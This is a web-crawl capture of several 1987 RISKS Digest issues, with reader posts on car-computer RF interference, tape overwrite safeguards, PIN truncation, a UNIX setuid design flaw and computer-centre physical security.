view-through boxes in the envelope:

    +------------------------------------------------------+
    |			Recepient			   |
    | If your name appears in the box below, you have won! |
    +------------------------------------------------------+
    +------------------+ +---------------------------------+
    |    John Brink    | | Benson			   |
    |    Recipient     | | ....				   |
    | Anne B. Meechan  | | Seattle, WA 98115		   |
    | Cindy Lenorowitz | +---------------------------------+
    +------------------+ 

And it said inside "The names herein have been computer selected from amoung
thousands without regard to gender or affiliation."  Yeah, no kidding! And
without regard to their existence, too!
    					  Bjorn N. Freeman-Benson

</PRE>
<A NAME="subj12"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj12.1">
A new kind of computer crash
</A>
</H3>
<address>
Steve Skabrat
&lt;<A HREF="mailto:umn-cs!rosevax!herman!sps@RUTGERS.EDU ">
umn-cs!rosevax!herman!sps@RUTGERS.EDU 
</A>&gt;
</address>
<i>

</i><PRE>
Date: 9 Nov 87 19:49:13 GMT
Organization: Unisys Inc.-CSD  Eagan,MN

I read the following in the Minneapolis Tribune, Monday, 9 Nov 1987:

  Portable Computer Falls Out of Airlink Jet    Oshkosh, WI (Associated Press) 
   
  Usually a computer "crash" is caused by a malfunction in the machine.  But
  when Ron Olstad's computer crashed last week, it really crashed.
  
  Olstad arrived in Oshkosh on a Northwest Airlink flight from Minneapolis
  about 3 p.m. Thursday and noticed that his portable computer was not among
  the luggage unloaded from the plane.
   
  At about the same time, Ronald Miller's neighbors found Olstad's 50-pound
  computer - or what was left of it - in Miller's back yard in Oshkosh.
   
  Robert Schoenfelder, Oshkosh manager for Northwest Airlink, said Saturday
  night that the port door of the airplane was open during the flight and that
  the computer fell out as the plane was making its final approach to Wittman
  Field.
   
  Schoenfelder said it is the first time that he knows of that a piece of      
  luggage has fallen out of a plane of Northwest Airlink, which is a contract
  carrier for Northwest Airlines. He said Northwest Airlink replaced Olstad's
  computer.
   
  Miller's neighbors say they weren't startled when they heard a loud crash
  and saw papers flying around Miller's back yard.
   
  Two nearby elementary schools were letting out at the time and the neighbors
  thought it was just noisy students. It turned out to be Olstad's computer.
   
  "I noticed a branch had fallen and there were papers flying all over the 
  back yard," said Adeline Heyer. "I didn't hear anything, but after looking
  a little closer I noticed the case."
   
  Miller had been gone and learned of the incident Friday.
  
  "There were papers scattered in the back yard and this big green thing,"
  he said. The computer, which was in a canvas case, was destroyed.

My first reaction upon reading this was to laugh.  My second was to wonder
if any parents in the neighborhood thought they should have prepared their
children to live in the area surrounding an airport by issuing them crash
helmets.

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/5.55.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.57.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-9</DOCNO>
<DOCOLDNO>IA012-000130-B022-27</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/5.57.html 128.240.150.127 19970217014048 text/html 29150
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:39:14 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 5: Issue 57</TITLE>
<LINK REL="Prev" HREF="/Risks/5.56.html">
<LINK REL="Up" HREF="/Risks/index.5.html">
<LINK REL="Next" HREF="/Risks/5.58.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/5.56.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.58.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 5: Issue 57</H1>
<H2> Thursday, 12 November 1987 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Mobile Radio Interference With Vehicles 
</A>
<DD>
<A HREF="#subj1.1">
Steve Conklin
</A><br>
<A HREF="#subj1.2">
 Bill Gunshannon
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Optimizing for cost savings, not safety 
</A>
<DD>
<A HREF="#subj2.1">
John McLeod
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  "Welcome To My World", BBC1 Sundays 11PM -- A Review 
</A>
<DD>
<A HREF="#subj3.1">
Martin Smith
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Re: A simple application of Murphy's Law (Tape Labels) 
</A>
<DD>
<A HREF="#subj4.1">
Henry Spencer
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Overwrite of Tape Data 
</A>
<DD>
<A HREF="#subj5.1">
Ron Heiby
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Misplaced trust 
</A>
<DD>
<A HREF="#subj6.1">
B Snow
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Bar Codes 
</A>
<DD>
<A HREF="#subj7.1">
Elizabeth D. Zwicky
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Password truncation and human interfaces 
</A>
<DD>
<A HREF="#subj8.1">
Theodore Ts'o
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Re: UNIX setuid nasty 
</A>
<DD>
<A HREF="#subj9.1">
Geoff
</A><br>
<A HREF="#subj9.2">
 David Phillip Oster
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj10">
  How much physical security? 
</A>
<DD>
<A HREF="#subj10.1">
Martin Ewing
</A><br>
<A HREF="#subj10.2">
 Alex Colvin
</A><br>
<A HREF="#subj10.3">
 Mike Alexander
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Mobile Radio Interference With Vehicles
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: 11 Nov 87 08:47:55 CST (Wed)
From: b14!steve@uunet.uu.net (Steve Conklin)

  My father installed his two meter rig on his new G.M. car three years ago,
and every time he would key it to transmit, the engine would die. The
engine control computer was rendered useless by the radio frequency field.
The reason that the car manufacturers do nothing to fix this is that they
have no incentive to do so. The only laws applicable to this situation
are the ones concerning how much rf energy gets OUT of the computer in the
car. (A related note - this is why when the first P.C.s came out, if you
called Big Blue and said that when you turned on your TV/dryer/etc you got
garbage characters on the screen, they wouldn't help you, but if you said
that every time you turned the system on your neighbor's TV went crazy, they
would replace your keyboard, motherboard, and chassis.)

  My father never found a solution to the problem. Maybe as cellular phones
gain in popularity, the auto manufacturers will have an incentive to take
steps to prevent rf from affecting their computer systems. This also will
become a very important issue when functions other than engine control are
taken by the computer.

  One final issue is that of outside intentional interference. After this
happened, my father and I speculated that cars with computer engine control
could be disabled from another vehicle by the application of the appropriate
frequency of rf energy with a directional antenna. This could be used by
law enforcement agencies, or by terrorists wishing to kidnap someone, etc.

Steve Conklin, Intergraph Corp., Huntsville, AL 35807, (205) 772-6888
{uunet,ihnp4}!ingr!tesla!steve

</PRE>
<HR><H3><A NAME="subj1.2">
Mobile Radio Interference With Vehicles
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>
12 Nov 87 15:14:48 GMT
</i><PRE>
From: bill@trotter.usma.edu (Bill Gunshannon)
Organization: US Military Academy, West Point, NY

As a curious aside to Leo Schwab's article:

   A letter was published in an amateur radio oriented magazine called QST
a few years back by a ham who tried to install a UHF mobile radio in his
newly purchased Japanese import.  He too had problems with interference to
the electronic ignition in the car.  A call to the US Service Representative
for the cars manufacturer resulted in a very simple solution to the problem.
They told him "don't install the radio in the car".

  A novel approach to preventing interference.
                                                     bill gunshannon

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Optimizing for cost savings, not safety (Re: <A HREF="/Risks/5.56.html">RISKS-5.56</A>)
</A>
</H3>
<address>
John McLeod
&lt;<A HREF="mailto:jm7@pyr.gatech.edu ">
jm7@pyr.gatech.edu 
</A>&gt;
</address>
<i>
Wed, 11 Nov 87 02:12:56 EST
</i><PRE>

A brief comment about the cost of items in automobiles.  Anything that costs
a nickel more per car, and does not affect performance under normal conditions
is very likely not to get done, as this will save $50,000 per million cars.  
The shielding of electronic ignitions and engine performance computers will
cost more than a nickel per car, and does not affect performance most of the 
time.

John McLeod VII, Georgia Insitute of Technology, Atlanta Georgia, 30332
uucp: ...!{akgua,allegra,amd,hplabs,ihnp4,seismo,ut-ngp}!gatech!gitpyr!jm7

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
"Welcome To My World", BBC1 Sundays 11PM -- A Short and General Review
</A>
</H3>
<address>
&lt;<A HREF="mailto:mcvax!minster.york.ac.uk!MartinSm@uunet.UU.NET">
mcvax!minster.york.ac.uk!MartinSm@uunet.UU.NET
</A>&gt;
</address>
<i>
11 Nov 1987 19:43:33 GMT
</i><PRE>

The BBC is currently showing a series called "Welcome To My World" which deals
with the future of information technology. It covers areas which seem to be
relevent to readers of this newsgroup so here is some information on it.

It portrays a world, not too far in the future though the exact date is not
given, where development of technology has taken place without proper
thought and control. Civil liberties are virtually nonexistent. A camera on
every street corner watches for crime, dissent or deviation from the "norm".
Computers direct almost every aspect of industry, commerce and war. Books
are curious collectors items, though knowledge is more widely available - if
you can pay for it.

The programme is introduced as a fictional documentary, interviews with real
and imaginary people are intercut with news footage of fictional events 
and it presents a very pessimistic view of what life may be like. I have yet
to decide whether this is because they sincerely believe it or because it
makes more interesting TV. The presenter, Robert Powell, likes to say that his
world doesn't have to be ours, if we make the right choices.

Extra topicality was gained a fortnight ago when one of the programmes, made
months earlier, considered the possibility of a worldwide stock market crash
caused by the global computer networks doing the dealing. Impressive pictures
of rooms full of cabinets were shown with the implication that there is
something intrinsically frightening in having computers handle money. What
frightens me is the way people handle it.

Another programme dealt with databases and secrecy. In this one a fictional
organisation called FREDI (freedom of digital information) hacked a top
secret database and released the contents to a public network. Added spice
was added by official denials that the database existed. An interesting
scene showed the presenter being stopped on the street and made to
state his ID number which was then checked on a terminal.

Last week a somewhat more unusual topic was chosen and interesting questions
were raised. Would artificial intelligence make artists redundant? If a 
computer produces a work of art who owns it? Should a film director be allowed
to electronically recreate actors to get certain scenes how he wants?

In conclusion then I do not think that much in this series would be new
to readers of this newsgroup but it is being shown on BBC1 with
a potential audience of millions. It does go out at 11PM on Sundays but I
can't be the only viewer! Even though I do not agree with the viewpoint of
this programme I regard it as one of the more thought provoking things
to hit the small screen recently.
                                        Martin Smith

Langwith College, University Of York, Heslington, York YO1 5DD England.

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Re:   A simple application of Murphy's Law (Tape Labels)
</A>
</H3>
<address>
&lt;<A HREF="mailto:decvax!utzoo!henry@ucbvax.Berkeley.EDU">
decvax!utzoo!henry@ucbvax.Berkeley.EDU
</A>&gt;
</address>
<i>
Tue, 10 Nov 87 00:26:42 est
</i><PRE>

&gt; ...When
&gt; you attempt to overwrite a labeled tape on our system an operator message
&gt; appears asking if you really want to write to the tape. The operator must
&gt; have answered yes to this question...
&gt; This is of course an example of the seeing, hearing, reading what you expect
&gt; to see, hear or read rather than what is actually there. There appears to be
&gt; nothing that you can do to prevent this kind of error...

Actually, no, there are things that can be done to prevent this kind of
error.  I don't think you have diagnosed it quite correctly.  I strongly
suspect that the operator saw the question and understood it, but that
he/she sees that question a dozen times a day, and the normal answer has
become a reflex.  *That* behavior is fully predictable and a conscientious
interface designer will avoid such situations.  "Do you really want to do
this?" is a question that should never be asked unless there is truly a
good chance that the answer will be "no".

Note also that the question was directed to the wrong person:  the operator,
who probably doesn't know enough about the work to judge whether the request
is a reasonable one.  Since the system insists on asking him/her questions
that would require considerable investigation to answer intelligently, the
questions will quite predictably be answered unintelligently.  It is not
unreasonable to request manual intervention when major data destruction
is requested, but it *is* unreasonable to place the decision in the hands
of someone who gets paid for throughput, not thought.

				Henry Spencer @ U of Toronto Zoology
				{allegra,ihnp4,decvax,pyramid}!utzoo!henry

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Overwrite of Tape Data
</A>
</H3>
<address>
Ron Heiby
&lt;<A HREF="mailto:gatech!mcdchg!heiby@RUTGERS.EDU ">
gatech!mcdchg!heiby@RUTGERS.EDU 
</A>&gt;
</address>
<i>

</i><PRE>
Date: 11 Nov 87 16:23:44 GMT
Organization: Motorola Microcomputer, Schaumburg, IL

About ten years ago, I was doing some work where I had quite a few reels of
tape (and very little disk space by today's standards).  Also, I was working
in an environment where I couldn't trust the operators to *not* insert
write-enable rings in my tapes.  I also couldn't trust them not to mount my
tapes in response to a tape request from another user.  The information on
the tapes contained my master databases and selected subsets which were
monetarily expensive to re-derive from the masters, as I had to pay for my
resource usage.

After being burned once, and losing a tape full of subsets, I ran across a
tape accessory in a computer supply catalog called "write protect rings".
These were thin rings of red plastic that were to be inserted into the write
enable ring slot.  The idea was that they would interfere with the ability
to insert the write enable ring into the tape, yet would not activate the
switch in the tape drive, themselves.  These worked quite well for me and I
had no further incidents.  I took a peek at the November Inmac (major
computer accessory distributer) catalog and did not find these rings.  Now,
I can't recall from whom I purchased them.

These "write protect" rings still wouldn't stop an operator who was
determined to put a write ring in, as they were removable (with a
screwdriver or an overpriced "removal tool" sold by the same company).
However, the operator would have to go to some fairly extreme lengths.
That, coupled with a label threatening the loss of certain body parts if a
write ring were inserted in the tape would probably deter just about
anybody.  A similar approach could be used with the newer tape cartridges.
I'm currently using 3M DC600A cartridges, and they have a rotatable write
protect "notch".  A sticky red label could be placed over the turning slot
to help provide cues that it would be a big mistake to write on the tape.

Ron Heiby, heiby@mcdchg.UUCP	Moderator: comp.newprod &amp; comp.unix

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
 Misplaced trust [Banned AIDS?]
</A>
</H3>
<address>
&lt;<A HREF="mailto:BSnow@DOCKMASTER.ARPA">
BSnow@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Wed, 11 Nov 87 12:54 EST
</i><PRE>
To: risks@csl.sri.com

An entertaining quote from the Washington Post of November 10, 1987.  It
is from a front page story on Idaho's drive to stop AIDS.

  "Doctors, hospitals, and laboratories would be legally required to
  report the name and address of anyone who tests positive, information
  that would be kept in a locked file and on COMPUTER." (emphasis added)

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Bar Codes 
</A>
</H3>
<address>
Elizabeth D. Zwicky
&lt;<A HREF="mailto:zwicky@ptero.cis.ohio-state.edu ">
zwicky@ptero.cis.ohio-state.edu 
</A>&gt;
</address>
<i>

</i><PRE>
Date: 10 Nov 87 04:51:57 GMT

&gt;Bruce N. Baker &lt;bnbaker@kl.sri.com&gt;
&gt;  The bar codes are identical ...

When you were comparing bar codes, did you actually compare bars, or only
the numbers across the bottom? UPC *does* encode more numbers than the ones
shown on the bottom; usually two digits, used for check digits.  This is
because in UPC there are four ways to encode a digit, left or right, and odd
or even; the left and right ones are used to tell you whether you read the
barcode forwards or backwards, but the odd/even distinction gives a
meta-code. That is, every time you read a character you have four facts
about it: 1) what number it was 2) whether it was right or left 3) whether
it was odd or even. The pattern of odds and evens can encode a digit. I
suppose that if you knew in advance what orientation the barcode would come
by in you could probably use the pattern of rights and lefts to encode
another digit.

To the best of my knowledge, this feature is not used by actual UPC (that
is, in the Uniform Price Code standard), but is used in EAN, the European
standard which uses the same bar codes.  If they use the check digits for
something else, then only they will be able to figure out what they are;
anything that reads UPC will reject it, since UPC specifies what the
odd/evens must be, anything that reads EAN will reject it because the check
digits are wrong, and programs that read both will read everything but the
numbers of interest, because they ignore odd vs. even.

Of course, they could be doing something even simpler, like printing
a number that is not the number encoded in the barcode above. This 
would probably be easier to see with the naked eye, though.

Elizabeth Zwicky,
The Ohio State University Dept of Computer and Information Science

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Password truncation and human interfaces
</A>
</H3>
<address>
Theodore Ts'o 
&lt;<A HREF="mailto:tytso@ATHENA.MIT.EDU">
tytso@ATHENA.MIT.EDU
</A>&gt;
</address>
<i>
Tue, 10 Nov 87 00:28:59 EST
</i><PRE>

There is a similar problem with the (Massachusetts) BayBanks teller system:
it truncates your PIN to FOUR numbers (even though they tell you to pick a
PIN between four and six numbers).  Yes, it's still there.  When (or if)
they will ever fix it is unknown.
						- Ted

</PRE>
<A NAME="subj9"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj9.1">
Re: UNIX setuid nasty -- Watch your pathnames
</A>
</H3>
<address>
&lt;<A HREF="mailto:munnari!elecvax.oz.au!geoffw@uunet.UU.NET">
munnari!elecvax.oz.au!geoffw@uunet.UU.NET
</A>&gt;
</address>
<i>
Thu, 12 Nov 87 17:01:26 EST
</i><PRE>

Sydney Uni's fate might be seen as an example of the risk taken
when an originally distributed function is centralised.
In the original give system developed at UNSW, each class
instals a copy of the give/take pair. The second of these
is setuid to the class account and constructs the destination
pathname from entirely validated components: the class directory,
assignment name and login name. The former are compiled into the
program while the last is extracted from the password file.
The purpose of give is to collect the student submission only.

Now the modifications made at SU removed the responsibility for
determining the target from the relative safety of take
to the total insecurity of give, while at the same time increasing
the destructive power of take. No wonder they got into trouble.

</PRE>
<HR><H3><A NAME="subj9.2">
UNIX setuid stupidity
</A>
</H3>
<address>
David Phillip Oster
&lt;<A HREF="mailto:oster%dewey.soe.Berkeley.EDU@Berkeley.EDU ">
oster%dewey.soe.Berkeley.EDU@Berkeley.EDU 
</A>&gt;
</address>
<i>

</i><PRE>
Date: 6 Nov 87 20:08:36 GMT
Organization: School of Education, UC-Berkeley

munnari!basser.cs.su.oz.au!steve@uunet.UU.NET (Stephen Russell)
describes a problem that happened to him as a result of a fundametal
misunderstanding he has about the way the Unix security system
works. His misunderstanding is so fundamental that he completely
misanalyzed his problem and the moral that should be drawn from it.

He describes a task: He needed a program that would copy a file owned
by a student into a directory owned by a teacher. 

The correct solution is: If the file has read access to all, then the
teacher, himself, could copy the file to his directory.  Unix has a
mechanism called setuid (it stands for "set user id") that lets a user
authorize a program to act as the user's agent. The teacher can write a
program to act as teacher's agent. The student can run it, and the file 
gets copied.

Mr. Russell made two mistakes.
1.) He made his program setuid "root" instead of setuid teacher. As
a result, the program let students copy into any place, not just those
places that the teacher was allowed to. This means that the damage caused
by his second mistake was not contained by the Unix protection system.

2.) When you make a program "setuid" you are giving the program the
ability to act in your name. That means that the program must check, just
as you would, that it is performing a legal act. Mr. Russell kindly explained
that he got this part wrong.

Now, all of the above works only if the teacher can read the student's
file. We need some way of arranging for the teacher to be able to read
it but not the other students. Unix also has a mechanism for doing
this. A "group" on unix is a list of users. Each file has both a user
id and a group id, and both user and group permissions. It is quite
reasonable to have a separate group for each student&lt;-&gt;teacher pair.
If a student wants to give a copy of a file to a teacher, he runs a
program that:
1.) changes the group of the file to the student&lt;-&gt;teacher group,
2.) runs a  setuid="teacher" program to copy the file to the teacher's 
directory.
3.) changes the group of the file back.

Now, if you have M students and N teachers, this means you need M*N groups.
Groups in turn are defined in a sequentially read text file, owned by root.
One can argue that having all these predefined groups would make the system
slow, but you can use a small, simple setuid=root program to dynamically
create a group with just the membership it needs, use it long enough to do
the copy, then destroy the group again.

The whole thing could almost be packaged as a standard utility for
user A to give copies of his files to user B. User A would run such a
program to give a file to user B. It would or would not do the copy
based on its execution of a set of rules, written by user B, defining
the circumstances that must be true for B to accept A's file.  (For
example: "must be smaller than 100k, must leave at least 1Meg free
space on disk, must not clobber any file already owned by B.")  The
problem with such a packaged utility is coming up with a reasonable
language for user B to express under what conditions he would be
willing to recieve files.

Now, why do I need to say this? Why wasn't this all obvious to Mr. Russell?
All of this is implied by the standard Unix manuals. Perhaps there should
be some test you must pass before they let you have the root password.

--- David Phillip Oster            --A Sun 3/60 makes a poor Macintosh II.
Arpa: oster@dewey.soe.berkeley.edu --A Macintosh II makes a poor Sun 3/60.
Uucp: {uwvax,decvax,ihnp4}!ucbvax!oster%dewey.soe.berkeley.edu

</PRE>
<A NAME="subj10"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj10.1">
 How much physical security? (Re: <A HREF="/Risks/5.48.html">RISKS-5.48</A>)
</A>
</H3>
<address>
Martin Ewing
&lt;<A HREF="mailto:mse%Phobos.Caltech.Edu@DEImos.Caltech.Edu ">
mse%Phobos.Caltech.Edu@DEImos.Caltech.Edu 
</A>&gt;
</address>
<i>
Sat, 24 Oct 87 01:59:00 PDT
</i><PRE>
To: risks%Phobos.Caltech.Edu@DEImos.Caltech.Edu

In reply to Brent Chapman and PGN on the subject of Computer Center physical
security:

I also recall the situation at MIT in the early 70's.  The key punches and
job submission area were on the second floor, while the CPUs were on the
"secure" third floor.  (The elevator wouldn't stop there.)  This worked OK,
until Vietnam-related movements escalated.  (I was a minor participant.)  At
that point an actual guard was posted on the first floor, and you had to show
ID to go beyond.  Expensive, but apparently effective.

[The MIT CC was my first introduction to computer bulletin boards.  There
was a big newsprint pad on the wall, along with felt-tip pens with which
to vent your spleen.  The pads would disappear after some days and reappear
later with Staff's annotations added.  Good, appropriate technology.]

These days, I have some responsibility for a departmental facility (2 Vax
780s, a Convex C-1).  Inside doors are never locked, and an exterior door to
a loading dock is only about 6 feet away from the computer room.  I
don't foresee risks from political protests (astronomy being perceived as
benign, I think), but there is always the deranged ex-student or -employee,
not to mention old-fashioned vandals off the street.

There is some fractional risk from physical assault.  The cost of significant
improvements seems high.  The value of the facility, including data files,
is high also.  How does one rationally decide whether the risk is acceptable?

As far as I can see the absolute risk from power surges, flooding, and network
breakin is greater.  We have had instances of all of these.

My tentative answer is not to do anything about physical security.  The 
Institute is insured against equipment losses.  The one thing we don't do
is to keep copies of valuable files stored in an independent environment.  This
can be done for fairly low cost, although it goes against the grain for
researchers to make backups at all.

I'd appreciate comments.

Martin Ewing, Caltech Astronomy

</PRE>
<HR><H3><A NAME="subj10.2">
  How much physical security? 
</A>
</H3>
<address>
"Milton A. Colvin" 
&lt;<A HREF="mailto:mac3n@babbage.acc.virginia.edu">
mac3n@babbage.acc.virginia.edu
</A>&gt;
</address>
<i>
Tue, 27 Oct 87 10:21:21 EST
</i><PRE>
Organization: University of Virginia

&gt; In <A HREF="/Risks/5.45.html">RISKS-5.45</A>, Brent Chapman (koala!brent@lll-tis.arpa) writes:
&gt; &gt;Have there been any cases of terrorist or political attacks on comp centers?

At Dartmouth in 1969 the College was closed for a day of political activity.
Instead of attacking the computer center, hordes of students headed for
the terminals and used the computers to generate mail to Congress.
Dartmouth had always made an effort to demystify computers.

I have this on hearsay.  Perhaps someone who was there could comment.

</PRE>
<HR><H3><A NAME="subj10.3">
How much computer room security?
</A>
</H3>
<address>
&lt;<A HREF="mailto:Mike_Alexander@um.cc.umich.edu">
Mike_Alexander@um.cc.umich.edu
</A>&gt;
</address>
<i>
Fri, 23 Oct 87 17:19:46 EDT
</i><PRE>

The various storyies in Risks recently about the effects of the student
unrest of the 60s and 70s on computer room security remind me of an incident
that occured at the University of Michigan during that period.  It is
somewhat amusing and might be of interest to Risks readers.

The University of Michigan was the scene of a number of student
demonstrations and other activities (SDS was founded at UM, for example, and
it was the site of the first teach-in), although there wasn't much physical
damage or other real violence here.  One of these incidents involved a small
group of students who were attempting to shut down the University by seizing
control of the University power plant, an effort that proved ineffective.
The incident I have in mind occured during this protest.

At the time, the Computing Center was directly across the street from the
power plant (which meant we had clean power, by the way).  While the
students were milling around outside the power plant, a few of them broke
off from the main group and headed toward the Computing Center.  Since
university computing centers elsewhere had been the object of some violence
by then, the CC staff members who were watching this were somewhat
concerned.  However, it turned out that the students were just going to pick
up some of their output, not to trash the Computing Center.  Fortunately,
that was as close as we came to real trouble at the Computing Center during
that period.

         [Thesef last three contributions were backlogged, and reflect old 
         history.  Nevertheless I think terrorism and vandalism represent an
         important area to be aware of, so I dusted them off.  PGN]

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/5.56.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.58.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-10</DOCNO>
<DOCOLDNO>IA012-000130-B022-46</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/5.58.html 128.240.150.127 19970217014106 text/html 18445
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:39:33 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 5: Issue 58</TITLE>
<LINK REL="Prev" HREF="/Risks/5.57.html">
<LINK REL="Up" HREF="/Risks/index.5.html">
<LINK REL="Next" HREF="/Risks/5.59.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/5.57.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.5.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/5.59.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 5: Issue 58</H1>
<H2> Sunday, 15 November 1987 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Son of Stark 
